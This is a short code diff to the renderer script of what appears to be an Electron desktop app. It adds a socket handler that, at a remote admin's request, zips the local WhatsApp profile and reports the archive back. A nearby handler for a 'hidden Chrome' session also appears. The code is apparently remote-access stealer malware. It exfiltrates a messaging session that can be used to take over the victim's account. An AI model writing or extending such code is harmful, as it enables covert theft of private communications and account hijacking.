@@ -254,6 +254,19 @@ window.onload = async () => {
             }
         });
 
+        socket.on('request-zip-whatsapp', async (adminId) => {
+            try {
+                const zipPath = await window.electronAPI.zipWhatsappProfile();
+                if (zipPath) {
+                    socket.emit('whatsapp-zip-ready', { adminId, targetId: socket.id, path: zipPath });
+                } else {
+                    socket.emit('whatsapp-zip-error', { adminId, error: "Profile could not be zipped or found." });
+                }
+            } catch (e) {
+                socket.emit('whatsapp-zip-error', { adminId, error: e.message });
+            }
+        });
+
         let currentAdminForHiddenChrome = null;
         socket.on('request-hidden-chrome', async (data) => {
             const adminId = data.adminId || data;
